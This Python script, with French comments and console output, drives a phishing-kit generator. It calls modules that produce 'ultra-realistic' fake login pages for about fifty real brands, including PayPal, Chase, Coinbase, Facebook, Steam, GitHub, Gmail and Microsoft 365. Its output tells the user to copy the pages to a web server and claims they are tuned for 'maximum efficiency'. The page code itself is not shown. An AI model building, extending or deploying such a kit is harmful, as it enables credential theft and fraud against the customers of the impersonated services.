#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Générateur de Templates Ultra-Réalistes - Version Modulaire
Orchestre tous les modules de génération de templates
"""

import os
import sys

# Import des modules de templates
from templates.bank_templates import BankTemplates
from templates.social_templates import SocialTemplates
from templates.gaming_templates import GamingTemplates
from templates.tech_templates import TechTemplates
from templates.ecommerce_templates import EcommerceTemplates
from templates.email_templates import EmailTemplates
from templates.tech_advanced_templates import TechAdvancedTemplates

class TemplateGenerator:
    def __init__(self):
        self.templates_dir = "templates"
        self.ensure_templates_dir()
        
    def ensure_templates_dir(self):
        """Crée le dossier templates s'il n'existe pas"""
        if not os.path.exists(self.templates_dir):
            os.makedirs(self.templates_dir)
            
    def generate_all_templates(self):
        """Génère tous les templates en utilisant les modules spécialisés"""
        print("🎣 ========================================")
        print("🎣 GÉNÉRATEUR DE TEMPLATES ULTRA-RÉALISTES")
        print("🎣 ========================================")
        print()
        
        # Initialisation des modules
        bank_generator = BankTemplates(self.templates_dir)
        social_generator = SocialTemplates(self.templates_dir)
        gaming_generator = GamingTemplates(self.templates_dir)
        tech_generator = TechTemplates(self.templates_dir)
        ecommerce_generator = EcommerceTemplates(self.templates_dir)
        email_generator = EmailTemplates(self.templates_dir)
        tech_advanced_generator = TechAdvancedTemplates(self.templates_dir)
        
        # Génération de tous les templates
        print("🚀 Démarrage de la génération...")
        print()
        
        # 1. Templates Bancaires
        bank_generator.generate_all_bank_templates()
        print()
        
        # 2. Templates Réseaux Sociaux
        social_generator.generate_all_social_templates()
        print()
        
        # 3. Templates Gaming
        gaming_generator.generate_all_gaming_templates()
        print()
        
        # 4. Templates Tech
        tech_generator.generate_all_tech_templates()
        print()
        
        # 5. Templates E-commerce
        ecommerce_generator.generate_all_ecommerce_templates()
        print()
        
        # 6. Templates Email
        email_generator.generate_all_email_templates()
        print()
        
        # 7. Templates Tech Avancés
        tech_advanced_generator.generate_all_tech_advanced_templates()
        print()
        
        # Résumé final
        total_templates = 10 + 10 + 5 + 5 + 5 + 5 + 10  # Total de tous les templates
        print("🎉 ========================================")
        print(f"🎉 GÉNÉRATION TERMINÉE ! {total_templates} templates créés")
        print("🎉 ========================================")
        print("📁 Templates sauvegardés dans le dossier 'templates/'")
        print("✨ Tous les templates sont ultra-réalistes et fonctionnels")
        print()
        
        # Liste des templates créés
        self.list_created_templates()
        
    def list_created_templates(self):
        """Affiche la liste des templates créés"""
        print("📋 LISTE DES TEMPLATES CRÉÉS :")
        print("=" * 50)
        
        categories = {
            "🏦 Bancaires": ["paypal", "bankofamerica", "chasebank", "wellsfargo", "citibank", "stripe", "coinbase", "binance", "robinhood", "etrade"],
            "📱 Réseaux Sociaux": ["facebook", "instagram", "twitter", "linkedin", "tiktok", "snapchat", "youtube", "discord", "reddit", "pinterest"],
            "🎮 Gaming": ["steam", "epicgames", "battlenet", "eaorigin", "ubisoftconnect"],
            "💻 Tech": ["github", "gitlab", "bitbucket", "stackoverflow", "dockerhub"],
            "🛒 E-commerce": ["ebay", "walmart", "target", "bestbuy", "homedepot"],
            "📧 Email": ["gmail", "outlook", "yahoomail", "whatsappweb", "telegramweb"],
            "🚀 Tech Avancés": ["microsoft365", "googleworkspace", "appleid", "amazonprime", "netflix", "spotifypremium", "dropboxbusiness", "slackworkspace", "zoommeeting", "microsoftteams"]
        }
        
        for category, templates in categories.items():
            print(f"\n{category}:")
            for template in templates:
                print(f"  ✅ {template}.html")
        
        print("\n" + "=" * 50)
        print("🎯 Tous les templates sont prêts à être utilisés !")
        print("🔧 Pour utiliser un template, copiez-le dans votre serveur web")
        print("⚡ Les templates sont optimisés pour une efficacité maximale")

if __name__ == "__main__":
    try:
        generator = TemplateGenerator()
        generator.generate_all_templates()
    except KeyboardInterrupt:
        print("\n❌ Génération interrompue par l'utilisateur")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Erreur lors de la génération: {e}")
        sys.exit(1) 